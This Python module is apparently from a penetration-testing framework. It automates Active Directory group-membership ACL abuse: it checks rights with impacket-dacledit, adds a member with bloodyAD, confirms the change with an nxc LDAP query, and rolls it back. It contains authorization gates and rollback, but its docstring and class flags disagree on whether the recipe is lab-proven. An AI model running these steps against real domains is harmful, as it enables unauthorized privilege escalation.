"""ADD-MEMBER / ADD-SELF validation executor -- T3 (ACL / object-takeover edges).

One technique string ``"ADD-MEMBER"`` covers both: ADD-SELF is simply the
default (``member = cfg.username``) -- there is zero mechanical difference, so
(same reasoning as the GENERIC-ALL decision, plan §0) a second class/string
would duplicate, not add, coverage.

Encodes the group-membership ACL-abuse recipe: a trustee already holding
Self-Membership/GenericWrite/GenericAll over a group adds a member, PROVEN by
a positive ``memberOf`` LDAP read-back (never the ``add groupMember`` call's
own exit code):

    impacket-dacledit -action read  (confirm the PRECONDITION ACE, over the GROUP)
    bloodyAD ... add groupMember '<group>' '<member>'
    nxc ldap --query "(sAMAccountName=<member>)" memberOf  (POSITIVE confirmation)
    ROLLBACK: bloodyAD ... remove groupMember ...; re-read memberOf;
              verified = positive_absence(bind_ok, memberOf_text, group)

Non-destructive (not irreversible, not code-exec): no destructive-confirm gate.
Mutating: yes (group membership changes), so a VERIFIED rollback is required.

``verified_recipe=False`` (recipe-known, not lab-proven). UNVERIFIED: the exact
bloodyAD/impacket-dacledit human-readable wording (see ``acl_common.py``'s module
docstring and this module's own markers below).
"""
from __future__ import annotations
from .. import netresolve

import re
from pathlib import Path
from typing import Any

from ..recommend import ParamSpec, ParamValue, values
from ..predicates import positive_absence
from .. import proof
from .. import states
from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv, Capability, CAP_CONTROL, ControlGrant)
from .acl_common import (dacledit_read_argv, confirm_ace,
                         _RE_ACE_GENERIC_ALL, _RE_ACE_GENERIC_WRITE,
                         _RE_ACE_SELF_MEMBERSHIP)


# bloodyAD groupMember-add success marker. UNVERIFIED -- pin in-lab (same
# status as rbcd.py's _RE_BLOODYAD_RBCD_OK).
_RE_BLOODYAD_ADD_MEMBER_OK = re.compile(
    r"(\[\+\][^\n]*added to|successfully added|added to|is a member)", re.I)

# A successful nxc ldap object read echoes the sAMAccountName anchor; its
# absence means the object was not actually read -> unknown (fail safe).
# Deliberately re-declared here rather than imported from ``probes.py``
# (modest duplication, zero cross-module coupling, same rationale as
# ``acl_common.py``'s ``_tool_errored`` and ``roast.py``'s ``_nxc_auth_flags``)
# -- importing FROM ``probes.py`` INTO an ``executors/`` module is the exact
# import-order-fragile direction ``acl_common.py``'s own docstring flags:
# ``probes.py`` imports from ``executors.base``, which forces the whole
# ``executors`` package (this file included) to load first.
_RE_ANCHOR = re.compile(r"(Response for object|\bsAMAccountName\b\s*[:=])", re.I)


def _tool_errored(res: RunResult) -> bool:
    return bool(res.error) or res.timed_out or res.returncode is None


def _account_read_ok(res: RunResult, text: str) -> bool:
    if _tool_errored(res) or not (text or "").strip():
        return False
    return bool(_RE_ANCHOR.search(text))


def _nxc_auth_flags(cfg) -> list[str]:
    """NetExec auth flags from the operator config (mirrors probes._nxc_auth
    and roast.py's _nxc_auth_flags -- same modest duplication rationale)."""
    return netresolve.nxc_auth_flags(cfg)


def _bloodyad_auth_argv(cfg, dc: str) -> list[str]:
    argv = ["bloodyAD", "-d", cfg.domain, "-u", cfg.username or ""]
    if cfg.nt_hash:
        argv += ["-H", cfg.nt_hash]
    elif cfg.password is not None:
        argv += ["-p", cfg.password]
    argv += ["--host", dc]
    return argv


def _principal_short(name: str) -> str:
    """The bare sAMAccountName root -- strips ``DOMAIN\\`` / ``@domain``."""
    name = (name or "").strip()
    if "\\" in name:
        name = name.split("\\", 1)[1]
    if "@" in name:
        name = name.split("@", 1)[0]
    return name


class AddMemberExecutor(ValidationExecutor):
    technique = "ADD-MEMBER"
    technique_class = "acl"
    terminal_kind = "file_write_readback"
    mutating = True
    verified_recipe = True        # lab-proven on GOAD 26NOV2026 (Night Watch, scored proved+clean)
    pre = frozenset({states.S0_USER_CREDS})
    eff = frozenset({states.S_ACL_CONTROL})
    recipe_ref = ("T3 ADD-MEMBER/ADD-SELF = dacledit read (confirm precondition "
                  "Self-Membership/GenericWrite/GenericAll over the GROUP) ; bloodyAD "
                  "add groupMember ; nxc ldap --query memberOf (POSITIVE readback = "
                  "the terminal) ; ROLLBACK: remove groupMember + positive_absence "
                  "readback (recipe-known, NOT lab-proven)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        entity = finding.entity or {}
        return [
            ParamSpec(
                name="group", kind="free",
                description="The AD group whose membership is modified. Requires "
                            "an already-held Self-Membership/GenericWrite/GenericAll "
                            "ACE over it.",
                recommended=entity.get("group") or "",
                rationale="The group entity of the aranum ACL finding.",
                required=True,
            ),
            ParamSpec(
                name="member", kind="free",
                description="The principal added to the group -- default is the "
                            "operator's own account (ADD-SELF); override for "
                            "ADD-MEMBER with a different principal.",
                recommended=ctx.config.username or "",
                rationale="ADD-SELF by default: the operator's own account, so "
                          "the new membership is immediately usable.",
            ),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        group = params["group"].value or ""
        return ctx.config.resolve_target_identity(group)

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        dc = ctx.config.dc_ip
        return [
            f"impacket-dacledit -action read -target '{v['group']}' -dc-ip {dc} <auth>  "
            "(confirm precondition ACE over the group)",
            f"bloodyAD ... --host {dc} add groupMember '{v['group']}' '{v['member']}'",
            f"nxc ldap {dc} <auth> --query \"(sAMAccountName={v['member']})\" memberOf  "
            "(POSITIVE readback = the terminal proof)",
            "ROLLBACK: bloodyAD ... remove groupMember ... + positive_absence readback",
        ]

    # ---------------------------------------------------------------- execute
    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        cfg = ctx.config
        v = values(params)
        group, member = v["group"], v["member"]
        dc = cfg.dc_ip
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)
        member_short = _principal_short(member)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode, note=note))

        # 1) confirm the PRECONDITION ACE over the GROUP object ---------------
        read_argv = dacledit_read_argv(cfg, group, dc)
        res = ctx.runner.run(read_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        read_text = (res.stdout or "") + (res.stderr or "")
        confirmed = confirm_ace(res, read_text, trustee=cfg.username or "",
                               right_res=(_RE_ACE_GENERIC_ALL, _RE_ACE_GENERIC_WRITE,
                                         _RE_ACE_SELF_MEMBERSHIP))
        record("confirm_precondition", read_argv, res, confirmed is not False,
              note="precondition confirmed" if confirmed else
                   ("precondition insufficient" if confirmed is False else "unconfirmed"))
        if confirmed is False:
            errors.append("add_member_not_confirmed")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if confirmed is None:
            errors.append("advisory:add_member_unconfirmed_attempting_anyway")

        # 2) gate the membership add (ordinary mutating-op gate) -------------
        verdict = ctx.authorizer.authorize("add_member", {"group": group, "member": member})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "add_member"
            errors.append("gate_denied:add_member")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "add_member"

        # 3) add the member ----------------------------------------------------
        add_argv = _bloodyad_auth_argv(cfg, dc) + ["add", "groupMember", group, member]
        res = ctx.runner.run(add_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        add_out = (res.stdout or "") + (res.stderr or "")
        add_ok = bool(_RE_BLOODYAD_ADD_MEMBER_OK.search(add_out))
        record("add_group_member", add_argv, res, add_ok,
              note="member added" if add_ok else "add failed")
        if not add_ok:
            errors.append("add_member_failed")
            return self._artifact(steps, gate, mutation, None, False, errors)
        mutation["applied"] = True
        if ctx.composed:
            ctx._pending_teardown = {"args": (group, member, member_short,)}

        # 4) POSITIVE readback = the terminal proof (never the add call's own
        #    exit code) ---------------------------------------------------------
        query_argv = ["nxc", "ldap", dc, *_nxc_auth_flags(cfg),
                     "--query", f"(sAMAccountName={member_short})", "sAMAccountName memberOf"]
        res = ctx.runner.run(query_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        query_text = (res.stdout or "") + (res.stderr or "")
        ok = bool(_account_read_ok(res, query_text) and group.lower() in query_text.lower())
        record("confirm_memberof", query_argv, res, ok,
              note="membership confirmed" if ok else "membership not confirmed")

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=ok,
            predicate=f"added {member} to {group}, confirmed by a positive memberOf read-back",
            proof_token=proof.proof_token("ADD-MEMBER", cfg.domain, group, member,
                                          "membership_confirmed" if ok else "membership_unconfirmed"),
            extra={"group": group, "member": member},
        )

        # 5) rollback: remove the member, verify non-vacuously -----------------
        if not ctx.composed:
            self._rollback(ctx, cfg, group, member, member_short, mutation, steps, errors, record)

        complete = bool(ok and (ctx.composed or mutation["rollback"]["performed"]))
        artifact = self._artifact(steps, gate, mutation, terminal_fact, complete, errors)
        if ctx.composed and mutation["applied"]:
            artifact["teardown_obligation"] = {"args": (group, member, member_short,)}
        return artifact

    # ---------------------------------------------------------------- composition (C)
    def chain_eff(self, ctx, finding) -> frozenset:
        return frozenset({states.control_for(self._params(ctx, finding)["group"].value)})

    def produced(self, ctx, finding, params, artifact) -> list[Capability]:
        if not ctx.composed or not artifact.get("complete") or not artifact.get("teardown_obligation"):
            return []
        target = params["group"].value
        actor = params["member"].value
        right = "Member"
        return [Capability(state=states.control_for(target), channel=CAP_CONTROL,
                           value=ControlGrant(actor, target, right), principal=actor)]

    def teardown(self, ctx, obligation) -> dict:
        mutation = {"applied": True, "rollback": {"performed": False, "verified": False,
                                                   "method": None}}
        self._rollback(ctx, ctx.config, *obligation["args"], mutation, [], [],
                       lambda *args, **kwargs: None)
        return mutation["rollback"]

    # ---------------------------------------------------------------- rollback
    def _rollback(self, ctx, cfg, group, member, member_short, mutation,
                  steps, errors, record) -> None:
        if not mutation["applied"]:
            return
        dc = cfg.dc_ip
        if ctx.authorizer.authorize("rollback", {"group": group, "member": member}) == "denied":
            errors.append("gate_denied:rollback")
            return
        mutation["rollback"]["performed"] = True
        mutation["rollback"]["method"] = "bloodyAD remove groupMember + positive_absence readback"

        remove_argv = _bloodyad_auth_argv(cfg, dc) + ["remove", "groupMember", group, member]
        res = ctx.runner.run(remove_argv, timeout=cfg.tool_timeout_s)
        # bloodyAD's own remove-groupMember wording is not pinned/trusted here
        # (plan §2.5) -- `performed` is recorded for the step preview; the ONLY
        # thing that gates `verified` below is the positive_absence read-back.
        record("rollback_remove_member", remove_argv, res, not _tool_errored(res))

        query_argv = ["nxc", "ldap", dc, *_nxc_auth_flags(cfg),
                     "--query", f"(sAMAccountName={member_short})", "sAMAccountName memberOf"]
        res = ctx.runner.run(query_argv, timeout=cfg.tool_timeout_s)
        query_text = (res.stdout or "") + (res.stderr or "")
        bind_ok = _account_read_ok(res, query_text)
        cleared = positive_absence(bind_ok, query_text, group)
        record("rollback_verify_absent", query_argv, res, cleared,
              note="membership removed (confirmed)" if cleared else "removal not confirmed")

        mutation["rollback"]["verified"] = cleared
        if not mutation["rollback"]["verified"]:
            errors.append("rollback_unverified")

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
